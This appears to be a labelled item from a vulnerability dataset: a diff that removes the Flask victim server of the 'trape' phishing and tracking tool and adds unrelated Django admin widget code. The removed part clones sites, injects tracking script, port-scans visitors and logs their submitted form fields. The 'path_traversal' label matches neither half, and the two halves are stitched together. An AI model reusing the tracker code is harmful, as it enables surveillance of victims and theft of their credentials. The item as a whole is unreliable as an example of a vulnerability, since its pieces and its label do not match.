@@ -2,204 +2,670 @@
 # Safety: vulnerable
 # Category: path_traversal
 
-#!/usr/bin/env python
+"""
 
-# -*- coding: utf-8 -*-
+Form Widget classes specific to the Django admin site.
 
-#**
+"""
 
-#
+from __future__ import unicode_literals
 
-#########
 
-# trape #
 
-#########
+import copy
 
-#
 
-# trape depends of this file
 
-# For full copyright information this visit: https://github.com/boxug/trape
+from django import forms
 
-#
+from django.contrib.admin.templatetags.admin_static import static
 
-# Copyright 2017 by boxug / <hey@boxug.com>
+from django.core.urlresolvers import reverse
 
-#**
+from django.forms.widgets import RadioFieldRenderer
 
-import time
+from django.forms.util import flatatt
 
-import urllib2
+from django.utils.html import escape, format_html, format_html_join, smart_urlquote
 
-from flask import Flask, render_template, session, request, json
+from django.utils.text import Truncator
 
-from core.victim_objects import *
+from django.utils.translation import ugettext as _
 
-import core.stats
+from django.utils.safestring import mark_safe
 
-from core.utils import utils
+from django.utils.encoding import force_text
 
-from core.db import Database
+from django.utils import six
 
 
 
 
 
-# Main parts, to generate relationships among others
+class FilteredSelectMultiple(forms.SelectMultiple):
 
-trape = core.stats.trape
+    """
 
-app = core.stats.app
-
-
-
-# call database
-
-db = Database()
+    A SelectMultiple with a JavaScript filter interface.
 
 
 
-class victim_server(object):
+    Note that the resulting JavaScript assumes that the jsi18n
 
-    @app.route("/" + trape.victim_path)
+    catalog has been loaded in the page
 
-    def homeVictim():
+    """
 
-        opener = urllib2.build_opener()
+    @property
 
-        headers = victim_headers()
+    def media(self):
 
-        opener.addheaders = headers
+        js = ["core.js", "SelectBox.js", "SelectFilter2.js"]
 
-        html = victim_inject_code(opener.open(trape.url_to_clone).read(), 'lure')
+        return forms.Media(js=[static("admin/js/%s" % path) for path in js])
+
+
+
+    def __init__(self, verbose_name, is_stacked, attrs=None, choices=()):
+
+        self.verbose_name = verbose_name
+
+        self.is_stacked = is_stacked
+
+        super(FilteredSelectMultiple, self).__init__(attrs, choices)
+
+
+
+    def render(self, name, value, attrs=None, choices=()):
+
+        if attrs is None:
+
+            attrs = {}
+
+        attrs['class'] = 'selectfilter'
+
+        if self.is_stacked:
+
+            attrs['class'] += 'stacked'
+
+        output = [super(FilteredSelectMultiple, self).render(name, value, attrs, choices)]
+
+        output.append('<script type="text/javascript">addEvent(window, "load", function(e) {')
+
+        # TODO: "id_" is hard-coded here. This should instead use the correct
+
+        # API to determine the ID dynamically.
+
+        output.append('SelectFilter.init("id_%s", "%s", %s, "%s"); });</script>\n'
+
+            % (name, self.verbose_name.replace('"', '\\"'), int(self.is_stacked), static('admin/')))
+
+        return mark_safe(''.join(output))
+
+
+
+class AdminDateWidget(forms.DateInput):
+
+
+
+    @property
+
+    def media(self):
+
+        js = ["calendar.js", "admin/DateTimeShortcuts.js"]
+
+        return forms.Media(js=[static("admin/js/%s" % path) for path in js])
+
+
+
+    def __init__(self, attrs=None, format=None):
+
+        final_attrs = {'class': 'vDateField', 'size': '10'}
+
+        if attrs is not None:
+
+            final_attrs.update(attrs)
+
+        super(AdminDateWidget, self).__init__(attrs=final_attrs, format=format)
+
+
+
+class AdminTimeWidget(forms.TimeInput):
+
+
+
+    @property
+
+    def media(self):
+
+        js = ["calendar.js", "admin/DateTimeShortcuts.js"]
+
+        return forms.Media(js=[static("admin/js/%s" % path) for path in js])
+
+
+
+    def __init__(self, attrs=None, format=None):
+
+        final_attrs = {'class': 'vTimeField', 'size': '8'}
+
+        if attrs is not None:
+
+            final_attrs.update(attrs)
+
+        super(AdminTimeWidget, self).__init__(attrs=final_attrs, format=format)
+
+
+
+class AdminSplitDateTime(forms.SplitDateTimeWidget):
+
+    """
+
+    A SplitDateTime Widget that has some admin-specific styling.
+
+    """
+
+    def __init__(self, attrs=None):
+
+        widgets = [AdminDateWidget, AdminTimeWidget]
+
+        # Note that we're calling MultiWidget, not SplitDateTimeWidget, because
+
+        # we want to define widgets.
+
+        forms.MultiWidget.__init__(self, widgets, attrs)
+
+
+
+    def format_output(self, rendered_widgets):
+
+        return format_html('<p class="datetime">{0} {1}<br />{2} {3}</p>',
+
+                           _('Date:'), rendered_widgets[0],
+
+                           _('Time:'), rendered_widgets[1])
+
+
+
+class AdminRadioFieldRenderer(RadioFieldRenderer):
+
+    def render(self):
+
+        """Outputs a <ul> for this set of radio fields."""
+
+        return format_html('<ul{0}>\n{1}\n</ul>',
+
+                           flatatt(self.attrs),
+
+                           format_html_join('\n', '<li>{0}</li>',
+
+                                            ((force_text(w),) for w in self)))
+
+
+
+class AdminRadioSelect(forms.RadioSelect):
+
+    renderer = AdminRadioFieldRenderer
+
+
+
+class AdminFileWidget(forms.ClearableFileInput):
+
+    template_with_initial = ('<p class="file-upload">%s</p>'
+
+                            % forms.ClearableFileInput.template_with_initial)
+
+    template_with_clear = ('<span class="clearable-file-input">%s</span>'
+
+                           % forms.ClearableFileInput.template_with_clear)
+
+
+
+def url_params_from_lookup_dict(lookups):
+
+    """
+
+    Converts the type of lookups specified in a ForeignKey limit_choices_to
+
+    attribute to a dictionary of query parameters
+
+    """
+
+    params = {}
+
+    if lookups and hasattr(lookups, 'items'):
+
+        items = []
+
+        for k, v in lookups.items():
+
+            if callable(v):
+
+                v = v()
+
+            if isinstance(v, (tuple, list)):
+
+                v = ','.join([str(x) for x in v])
+
+            elif isinstance(v, bool):
+
+                # See django.db.fields.BooleanField.get_prep_lookup
+
+                v = ('0', '1')[v]
+
+            else:
+
+                v = six.text_type(v)
+
+            items.append((k, v))
+
+        params.update(dict(items))
+
+    return params
+
+
+
+class ForeignKeyRawIdWidget(forms.TextInput):
+
+    """
+
+    A Widget for displaying ForeignKeys in the "raw_id" interface rather than
+
+    in a <select> box.
+
+    """
+
+    def __init__(self, rel, admin_site, attrs=None, using=None):
+
+        self.rel = rel
+
+        self.admin_site = admin_site
+
+        self.db = using
+
+        super(ForeignKeyRawIdWidget, self).__init__(attrs)
+
+
+
+    def render(self, name, value, attrs=None):
+
+        rel_to = self.rel.to
+
+        if attrs is None:
+
+            attrs = {}
+
+        extra = []
+
+        if rel_to in self.admin_site._registry:
+
+            # The related object is registered with the same AdminSite
+
+            related_url = reverse('admin:%s_%s_changelist' %
+
+                                    (rel_to._meta.app_label,
+
+                                    rel_to._meta.model_name),
+
+                                    current_app=self.admin_site.name)
+
+
+
+            params = self.url_parameters()
+
+            if params:
+
+                url = '?' + '&amp;'.join(['%s=%s' % (k, v) for k, v in params.items()])
+
+            else:
+
+                url = ''
+
+            if "class" not in attrs:
+
+                attrs['class'] = 'vForeignKeyRawIdAdminField' # The JavaScript code looks for this hook.
+
+            # TODO: "lookup_id_" is hard-coded here. This should instead use
+
+            # the correct API to determine the ID dynamically.
+
+            extra.append('<a href="%s%s" class="related-lookup" id="lookup_id_%s" onclick="return showRelatedObjectLookupPopup(this);"> '
+
+                            % (related_url, url, name))
+
+            extra.append('<img src="%s" width="16" height="16" alt="%s" /></a>'
+
+                            % (static('admin/img/selector-search.gif'), _('Lookup')))
+
+        output = [super(ForeignKeyRawIdWidget, self).render(name, value, attrs)] + extra
+
+        if value:
+
+            output.append(self.label_for_value(value))
+
+        return mark_safe(''.join(output))
+
+
+
+    def base_url_parameters(self):
+
+        return url_params_from_lookup_dict(self.rel.limit_choices_to)
+
+
+
+    def url_parameters(self):
+
+        from django.contrib.admin.views.main import TO_FIELD_VAR
+
+        params = self.base_url_parameters()
+
+        params.update({TO_FIELD_VAR: self.rel.get_related_field().name})
+
+        return params
+
+
+
+    def label_for_value(self, value):
+
+        key = self.rel.get_related_field().name
+
+        try:
+
+            obj = self.rel.to._default_manager.using(self.db).get(**{key: value})
+
+            return '&nbsp;<strong>%s</strong>' % escape(Truncator(obj).words(14, truncate='...'))
+
+        except (ValueError, self.rel.to.DoesNotExist):
+
+            return ''
+
+
+
+class ManyToManyRawIdWidget(ForeignKeyRawIdWidget):
+
+    """
+
+    A Widget for displaying ManyToMany ids in the "raw_id" interface rather than
+
+    in a <select multiple> box.
+
+    """
+
+    def render(self, name, value, attrs=None):
+
+        if attrs is None:
+
+            attrs = {}
+
+        if self.rel.to in self.admin_site._registry:
+
+            # The related object is registered with the same AdminSite
+
+            attrs['class'] = 'vManyToManyRawIdAdminField'
+
+        if value:
+
+            value = ','.join([force_text(v) for v in value])
+
+        else:
+
+            value = ''
+
+        return super(ManyToManyRawIdWidget, self).render(name, value, attrs)
+
+
+
+    def url_parameters(self):
+
+        return self.base_url_parameters()
+
+
+
+    def label_for_value(self, value):
+
+        return ''
+
+
+
+    def value_from_datadict(self, data, files, name):
+
+        value = data.get(name)
+
+        if value:
+
+            return value.split(',')
+
+
+
+
+
+class RelatedFieldWidgetWrapper(forms.Widget):
+
+    """
+
+    This class is a wrapper to a given widget to add the add icon for the
+
+    admin interface.
+
+    """
+
+    def __init__(self, widget, rel, admin_site, can_add_related=None):
+
+        self.is_hidden = widget.is_hidden
+
+        self.needs_multipart_form = widget.needs_multipart_form
+
+        self.attrs = widget.attrs
+
+        self.choices = widget.choices
+
+        self.widget = widget
+
+        self.rel = rel
+
+        # Backwards compatible check for whether a user can add related
+
+        # objects.
+
+        if can_add_related is None:
+
+            can_add_related = rel.to in admin_site._registry
+
+        self.can_add_related = can_add_related
+
+        # so we can check if the related object is registered with this AdminSite
+
+        self.admin_site = admin_site
+
+
+
+    def __deepcopy__(self, memo):
+
+        obj = copy.copy(self)
+
+        obj.widget = copy.deepcopy(self.widget, memo)
+
+        obj.attrs = self.widget.attrs
+
+        memo[id(self)] = obj
+
+        return obj
+
+
+
+    @property
+
+    def media(self):
+
+        return self.widget.media
+
+
+
+    def render(self, name, value, *args, **kwargs):
+
+        rel_to = self.rel.to
+
+        info = (rel_to._meta.app_label, rel_to._meta.model_name)
+
+        self.widget.choices = self.choices
+
+        output = [self.widget.render(name, value, *args, **kwargs)]
+
+        if self.can_add_related:
+
+            related_url = reverse('admin:%s_%s_add' % info, current_app=self.admin_site.name)
+
+            # TODO: "add_id_" is hard-coded here. This should instead use the
+
+            # correct API to determine the ID dynamically.
+
+            output.append('<a href="%s" class="add-another" id="add_id_%s" onclick="return showAddAnotherPopup(this);"> '
+
+                          % (related_url, name))
+
+            output.append('<img src="%s" width="10" height="10" alt="%s"/></a>'
+
+                          % (static('admin/img/icon_addlink.gif'), _('Add Another')))
+
+        return mark_safe(''.join(output))
+
+
+
+    def build_attrs(self, extra_attrs=None, **kwargs):
+
+        "Helper function for building an attribute dictionary."
+
+        self.attrs = self.widget.build_attrs(extra_attrs=None, **kwargs)
+
+        return self.attrs
+
+
+
+    def value_from_datadict(self, data, files, name):
+
+        return self.widget.value_from_datadict(data, files, name)
+
+
+
+    def id_for_label(self, id_):
+
+        return self.widget.id_for_label(id_)
+
+
+
+class AdminTextareaWidget(forms.Textarea):
+
+    def __init__(self, attrs=None):
+
+        final_attrs = {'class': 'vLargeTextField'}
+
+        if attrs is not None:
+
+            final_attrs.update(attrs)
+
+        super(AdminTextareaWidget, self).__init__(attrs=final_attrs)
+
+
+
+class AdminTextInputWidget(forms.TextInput):
+
+    def __init__(self, attrs=None):
+
+        final_attrs = {'class': 'vTextField'}
+
+        if attrs is not None:
+
+            final_attrs.update(attrs)
+
+        super(AdminTextInputWidget, self).__init__(attrs=final_attrs)
+
+
+
+class AdminEmailInputWidget(forms.EmailInput):
+
+    def __init__(self, attrs=None):
+
+        final_attrs = {'class': 'vTextField'}
+
+        if attrs is not None:
+
+            final_attrs.update(attrs)
+
+        super(AdminEmailInputWidget, self).__init__(attrs=final_attrs)
+
+
+
+class AdminURLFieldWidget(forms.URLInput):
+
+    def __init__(self, attrs=None):
+
+        final_attrs = {'class': 'vURLField'}
+
+        if attrs is not None:
+
+            final_attrs.update(attrs)
+
+        super(AdminURLFieldWidget, self).__init__(attrs=final_attrs)
+
+
+
+    def render(self, name, value, attrs=None):
+
+        html = super(AdminURLFieldWidget, self).render(name, value, attrs)
+
+        if value:
+
+            value = force_text(self._format_value(value))
+
+            final_attrs = {'href': mark_safe(smart_urlquote(value))}
+
+            html = format_html(
+
+                '<p class="url">{0} <a {1}>{2}</a><br />{3} {4}</p>',
+
+                _('Currently:'), flatatt(final_attrs), value,
+
+                _('Change:'), html
+
+            )
 
         return html
 
 
 
-    @app.route("/register", methods=["POST"])
 
-    def register():
 
-        vId = request.form['vId']
+class AdminIntegerFieldWidget(forms.TextInput):
 
-        if vId == '':
+    class_name = 'vIntegerField'
 
-          vId = utils.generateToken(5)
 
 
+    def __init__(self, attrs=None):
 
-        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], request.user_agent.platform, request.user_agent.browser, request.user_agent.version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
+        final_attrs = {'class': self.class_name}
 
-        victimGeo = victim_geo(vId, 'city', request.form['countryCode'], request.form['country'], request.form['query'], request.form['lat'], request.form['lon'], request.form['org'], request.form['region'], request.form['regionName'], request.form['timezone'], request.form['zip'], request.form['isp'], str(request.user_agent))
+        if attrs is not None:
 
+            final_attrs.update(attrs)
 
+        super(AdminIntegerFieldWidget, self).__init__(attrs=final_attrs)
 
-        utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " A victim has been connected from " + utils.Color['blue'] + victimGeo.ip + utils.Color['white'] + ' with the following identifier: ' + utils.Color['green'] + vId + utils.Color['white'])
 
-        cant = int(db.sentences_victim('count_times', vId, 3, 0))
 
+class AdminBigIntegerFieldWidget(AdminIntegerFieldWidget):
 
+    class_name = 'vBigIntegerField'
 
-        db.sentences_victim('insert_click', [vId, trape.url_to_clone, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
 
-        db.sentences_victim('delete_networks', [vId], 2)
 
+class AdminCommaSeparatedIntegerFieldWidget(forms.TextInput):
 
+    def __init__(self, attrs=None):
 
-        if cant > 0:
+        final_attrs = {'class': 'vCommaSeparatedIntegerField'}
 
-            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s his " + str(cant + 1) + " time")
+        if attrs is not None:
 
-            db.sentences_victim('update_victim', [victimConnect, vId, time.time()], 2)
+            final_attrs.update(attrs)
 
-            db.sentences_victim('update_victim_geo', [victimGeo, vId], 2)
-
-        else:
-
-            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s his first time")
-
-            db.sentences_victim('insert_victim', [victimConnect, vId, time.time()], 2)
-
-            db.sentences_victim('insert_victim_geo', [victimGeo, vId], 2)
-
-        return json.dumps({'status' : 'OK', 'vId' : vId});
-
-
-
-    @app.route("/nr", methods=["POST"])
-
-    def networkRegister():
-
-        vId = request.form['vId']
-
-        vIp = request.form['ip']
-
-        vnetwork = request.form['red']
-
-        if vId == '':
-
-          vId = utils.generateToken(5)
-
-        utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "+" + utils.Color['white'] + "]" + utils.Color['whiteBold'] + " " + vnetwork + utils.Color['white'] + " session detected from " + utils.Color['blue'] + vIp + utils.Color['white'] + ' ' + "with ID: " + utils.Color['green'] + vId + utils.Color['white'])
-
-
-
-        cant = int(db.sentences_victim('count_victim_network', [vId, vnetwork], 3, 0))
-
-
-
-        if cant > 0:
-
-            db.sentences_victim('update_network', [vId, vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
-
-        else:
-
-            db.sentences_victim('insert_networks', [vId, vIp, request.environ['REMOTE_ADDR'], vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
-
-        return json.dumps({'status' : 'OK', 'vId' : vId});
-
-
-
-    @app.route("/redv")
-
-    def redirectVictim():
-
-        url = request.args.get('url')
-
-        opener = urllib2.build_opener()
-
-        headers = victim_headers()
-
-        opener.addheaders = headers
-
-        html = victim_inject_code(opener.open(url).read(), 'vscript')
-
-        return html
-
-
-
-    @app.route("/regv", methods=["POST"])
-
-    def registerRequest():
-
-        vrequest = victim_request(request.form['vId'], request.form['site'], request.form['fid'], request.form['name'], request.form['value'], request.form['sId'])
-
-        db.sentences_victim('insert_requests', [vrequest, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
-
-        utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "=" + utils.Color['white'] + "]" + " " + 'Receiving data from: ' + utils.Color['green'] + vrequest.id + utils.Color['white']  + ' ' + 'on' + ' ' + utils.Color['blue'] + vrequest.site + utils.Color['white'] + '\t\n' + vrequest.fid + '\t' + vrequest.name + ':\t' + vrequest.value)
-
-        return json.dumps({'status' : 'OK', 'vId' : vrequest.id});
-
-
-
-    @app.route("/tping", methods=["POST"])
-
-    def receivePing():
-
-        vrequest = request.form['id']
-
-        db.sentences_victim('report_online', [vrequest])
-
-        return json.dumps({'status' : 'OK', 'vId' : vrequest});
+        super(AdminCommaSeparatedIntegerFieldWidget, self).__init__(attrs=final_attrs)
